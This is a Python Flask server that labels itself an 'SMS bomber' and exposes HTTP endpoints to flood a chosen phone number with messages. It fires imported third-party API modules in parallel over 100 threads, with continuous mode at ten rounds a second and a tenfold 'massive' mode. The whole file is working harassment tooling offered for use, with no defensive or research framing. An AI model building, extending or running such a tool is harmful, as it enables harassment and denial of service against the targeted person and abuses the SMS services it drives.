from flask import Flask, jsonify, request
import threading
import concurrent.futures
import time
import os
import logging
import asyncio
import aiohttp
import json

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Load ALL API modules (apis1.py to apis10.py)
ALL_APIS = []
for i in range(1, 11):
    try:
        module = __import__(f'apis{i}')
        ALL_APIS.append(getattr(module, f'run_apis{i}'))
        logger.info(f"✅  Loaded apis{i}.py")
    except Exception as e:
        logger.warning(f"❌  Failed to load apis{i}.py: {e}")

# Global thread pool for MAXIMUM parallelism
THREAD_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=100)  # 100 concurrent threads!
active_bombings = {}

def bomb_phone_ultrafast(phone_number, attack_id):
    """Bomb a phone number with ALL APIs in PARALLEL - NO DELAYS"""
    logger.info(f"🚀 ULTRA-FAST BOMBING STARTED for {phone_number}")
    
    # Submit ALL APIs to thread pool simultaneously
    futures = []
    for api_func in ALL_APIS:
        future = THREAD_POOL.submit(api_func, phone_number)
        futures.append(future)
    
    # Wait for ALL to complete (or timeout)
    completed = 0
    for future in concurrent.futures.as_completed(futures, timeout=5):
        try:
            result = future.result()
            completed += 1
        except Exception as e:
            logger.error(f"API failed: {e}")
    
    logger.info(f"✅  Bombing completed: {completed}/{len(ALL_APIS)} APIs executed")
    
    # Remove from active bombings
    if attack_id in active_bombings:
        del active_bombings[attack_id]

def continuous_bombing(phone_number, attack_id, interval=0.1):
    """Continuous bombing with specified interval (in seconds)"""
    while attack_id in active_bombings:
        bomb_phone_ultrafast(phone_number, attack_id)
        time.sleep(interval)

@app.route('/bomb/<phone_number>', methods=['GET'])
def bomb_single(phone_number):
    """Single ultra-fast bombing - ALL APIs in parallel"""
    if not phone_number.isdigit() or len(phone_number) != 10:
        return jsonify({"error": "Invalid phone number. Must be 10 digits."}), 400
    
    # Start bombing in background
    attack_id = str(time.time())
    threading.Thread(
        target=bomb_phone_ultrafast,
        args=(phone_number, attack_id),
        daemon=True
    ).start()
    
    return jsonify({
        "status": "BOMBING_STARTED",
        "phone": phone_number,
        "apis": len(ALL_APIS),
        "mode": "ULTRA_FAST_PARALLEL",
        "message": "All APIs firing simultaneously!"
    })

@app.route('/bomb/continuous/<phone_number>', methods=['GET'])
def bomb_continuous(phone_number):
    """Continuous bombing - runs repeatedly"""
    if not phone_number.isdigit() or len(phone_number) != 10:
        return jsonify({"error": "Invalid phone number. Must be 10 digits."}), 400
    
    attack_id = str(time.time())
    active_bombings[attack_id] = phone_number
    
    # Start continuous bombing
    threading.Thread(
        target=continuous_bombing,
        args=(phone_number, attack_id, 0.1),  # 0.1 second interval = 10 times per second
        daemon=True
    ).start()
    
    return jsonify({
        "status": "CONTINUOUS_BOMBING_STARTED",
        "phone": phone_number,
        "attack_id": attack_id,
        "apis": len(ALL_APIS),
        "interval": "0.1 seconds",
        "message": "Continuous ultra-fast bombing activated!"
    })

@app.route('/bomb/stop/<attack_id>', methods=['GET'])
def stop_bombing(attack_id):
    """Stop continuous bombing"""
    if attack_id in active_bombings:
        phone = active_bombings[attack_id]
        del active_bombings[attack_id]
        return jsonify({
            "status": "STOPPED",
            "attack_id": attack_id,
            "phone": phone,
            "message": "Bombing stopped"
        })
    return jsonify({"error": "Attack ID not found"}), 404

@app.route('/bomb/massive/<phone_number>', methods=['GET'])
def bomb_massive(phone_number):
    """MASSIVE parallel bombing - 10x simultaneous attacks"""
    if not phone_number.isdigit() or len(phone_number) != 10:
        return jsonify({"error": "Invalid phone number. Must be 10 digits."}), 400
    
    # Start 10 parallel bombing sessions
    for i in range(10):
        attack_id = f"{phone_number}_{time.time()}_{i}"
        threading.Thread(
            target=bomb_phone_ultrafast,
            args=(phone_number, attack_id),
            daemon=True
        ).start()
    
    return jsonify({
        "status": "MASSIVE_BOMBING_STARTED",
        "phone": phone_number,
        "parallel_attacks": 10,
        "total_api_calls": len(ALL_APIS) * 10,
        "message": "MASSIVE 10x parallel bombing initiated!"
    })

@app.route('/status', methods=['GET'])
def get_status():
    """Get bombing status"""
    return jsonify({
        "status": "READY",
        "apis_loaded": len(ALL_APIS),
        "active_bombings": len(active_bombings),
        "active_numbers": list(active_bombings.values()),
        "thread_pool_size": THREAD_POOL._max_workers,
        "server_time": time.time()
    })

@app.route('/test/<phone_number>', methods=['GET'])
def test_single(phone_number):
    """Test single API call for each API"""
    if not phone_number.isdigit() or len(phone_number) != 10:
        return jsonify({"error": "Invalid phone number. Must be 10 digits."}), 400
    
    results = []
    for api_func in ALL_APIS:
        try:
            start = time.time()
            api_func(phone_number)
            elapsed = time.time() - start
            results.append({
                "api": api_func.__name__,
                "status": "SUCCESS",
                "time_ms": round(elapsed * 1000, 2)
            })
        except Exception as e:
            results.append({
                "api": api_func.__name__,
                "status": "ERROR",
                "error": str(e)[:100]
            })
    
    return jsonify({
        "phone": phone_number,
        "results": results,
        "successful": sum(1 for r in results if r["status"] == "SUCCESS"),
        "failed": sum(1 for r in results if r["status"] == "ERROR")
    })

@app.route('/')
def home():
    """API Documentation"""
    return jsonify({
        "name": "ULTRA-FAST SMS BOMBER API",
        "developer": "venom",
        "description": "MAXIMUM SPEED - ALL APIs in PARALLEL",
        "endpoints": {
            "single_bomb": "GET /bomb/9876543210",
            "continuous": "GET /bomb/continuous/9876543210",
            "massive": "GET /bomb/massive/9876543210 (10x parallel)",
            "stop": "GET /bomb/stop/{attack_id}",
            "status": "GET /status",
            "test": "GET /test/9876543210"
        },
        "features": [
            "All APIs run in parallel",
            "No delays between API calls",
            "100 concurrent threads",
            "Continuous bombing option",
            "Massive 10x parallel attacks"
        ],
        "stats": {
            "apis_loaded": len(ALL_APIS),
            "max_concurrent": 100,
            "estimated_speed": f"{len(ALL_APIS) * 10} API calls/second"
        }
    })

if __name__ == '__main__':
    print("=" * 70)
    print("💣 ULTRA-FAST SMS BOMBER API")
    print("=" * 70)
    print(f"✅  Loaded {len(ALL_APIS)} API modules")
    print(f"⚡  Thread Pool: 100 concurrent threads")
    print("=" * 70)
    print("🔥 ENDPOINTS:")
    print("  /bomb/<number>          - Single ultra-fast attack")
    print("  /bomb/continuous/<num>  - Continuous bombing (0.1s interval)")
    print("  /bomb/massive/<num>     - MASSIVE 10x parallel attacks")
    print("  /bomb/stop/<id>         - Stop continuous bombing")
    print("  /status                 - Check server status")
    print("  /test/<number>          - Test all APIs")
    print("=" * 70)
    
    port = 7863
    app.run(debug=False, host='0.0.0.0', port=port, threaded=True)
